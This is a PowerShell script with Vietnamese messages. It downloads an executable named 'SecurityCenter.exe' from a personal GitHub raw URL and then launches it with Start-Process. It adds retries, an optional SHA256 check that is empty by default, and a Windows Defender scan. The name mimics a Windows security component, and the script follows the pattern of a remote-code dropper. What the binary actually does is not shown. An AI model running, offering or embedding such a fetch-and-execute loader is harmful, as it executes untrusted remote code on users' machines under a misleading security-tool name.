[CmdletBinding()]
param(
    [string]$Url            = "https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/SecurityCenter.exe",
    [string]$OutFile        = "SecurityCenter.exe",
    [string]$ExpectedSha256 = "",
    [int]$MaxRetries        = 3,
    [int]$TimeoutSec        = 120,
    [switch]$NoRun,
    [switch]$Wait
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

$psMajor = $PSVersionTable.PSVersion.Major
Write-Host "PowerShell $($PSVersionTable.PSVersion) — major=$psMajor"

try {
    $bits = 3072
    try {
        $tls13 = [int][Net.SecurityProtocolType]::Tls13
        $bits  = $bits -bor $tls13
    } catch { }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]$bits
} catch {
    Write-Warning "Không thiết lập được TLS: $($_.Exception.Message)"
}

if ([System.IO.Path]::IsPathRooted($OutFile)) {
    $outPath = $OutFile
} else {
    $outPath = Join-Path (Get-Location).Path $OutFile
}

function Invoke-Download {
    param(
        [string]$Uri,
        [string]$Path,
        [int]$TimeoutSec
    )

    if (Get-Command Invoke-WebRequest -ErrorAction SilentlyContinue) {
        $params = @{
            Uri         = $Uri
            OutFile     = $Path
            ErrorAction = "Stop"
        }
        if ($psMajor -ge 3)                     { $params.TimeoutSec     = $TimeoutSec }
        if ($psMajor -ge 3 -and $psMajor -lt 6) { $params.UseBasicParsing = $true }
        Invoke-WebRequest @params
    } else {
        $wc = New-Object System.Net.WebClient
        try {
            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (compatible; PS-$psMajor)")
            $wc.DownloadFile($Uri, $Path)
        } finally {
            $wc.Dispose()
        }
    }
}

$attempt = 0
$done    = $false

while (-not $done) {
    $attempt++
    try {
        Write-Host "[$attempt/$MaxRetries] Tải: $Url" -ForegroundColor Cyan
        Invoke-Download -Uri $Url -Path $outPath -TimeoutSec $TimeoutSec
        $done = $true
    } catch {
        Write-Warning "Lỗi lần $attempt`: $($_.Exception.Message)"
        if ($attempt -ge $MaxRetries) { throw "Tải thất bại sau $MaxRetries lần." }
        Start-Sleep -Seconds (2 * $attempt)
    }
}

if (-not (Test-Path -LiteralPath $outPath)) { throw "File không tồn tại: $outPath" }

$fi = Get-Item -LiteralPath $outPath
if ($fi.Length -le 0) { throw "File tải về rỗng." }
Write-Host "Đã tải: $($fi.FullName) ($($fi.Length) bytes)" -ForegroundColor Green

if (Get-Command Get-FileHash -ErrorAction SilentlyContinue) {
    $hash = (Get-FileHash -LiteralPath $outPath -Algorithm SHA256).Hash
} else {
    $sha    = [System.Security.Cryptography.SHA256]::Create()
    $stream = [System.IO.File]::OpenRead($outPath)
    try {
        $bytes = $sha.ComputeHash($stream)
    } finally {
        $stream.Close()
        $sha.Clear()
    }
    $hash = -join ($bytes | ForEach-Object { $_.ToString("X2") })
}
Write-Host "SHA256: $hash"

if ($ExpectedSha256) {
    if ($hash -ne $ExpectedSha256.ToUpper()) {
        Remove-Item -LiteralPath $outPath -Force
        throw "SHA256 KHÔNG khớp! File đã bị xóa."
    }
    Write-Host "✔ Hash khớp." -ForegroundColor Green
}

if (Get-Command Start-MpScan -ErrorAction SilentlyContinue) {
    Write-Host "Đang quét Windows Defender..." -ForegroundColor Yellow
    try {
        Start-MpScan -ScanType CustomScan -ScanPath $outPath
    } catch {
        Write-Warning "Quét thất bại: $($_.Exception.Message)"
    }
} else {
    Write-Host "Không có Windows Defender cmdlet — bỏ qua quét." -ForegroundColor DarkYellow
}

if ($NoRun) {
    Write-Host "Đã tải xong (không chạy do -NoRun): $outPath" -ForegroundColor Yellow
    return
}

Write-Host "Đang chạy: $outPath" -ForegroundColor Cyan

$startParams = @{
    FilePath     = $outPath
    PassThru     = $true
    WorkingDirectory = (Split-Path -Parent $outPath)
}
if ($Wait) { $startParams.Wait = $true }

$proc = Start-Process @startParams

if ($Wait) {
    Write-Host "Tiến trình kết thúc. ExitCode = $($proc.ExitCode)" -ForegroundColor Green
} else {
    Write-Host "Đã khởi chạy. PID = $($proc.Id)" -ForegroundColor Green
}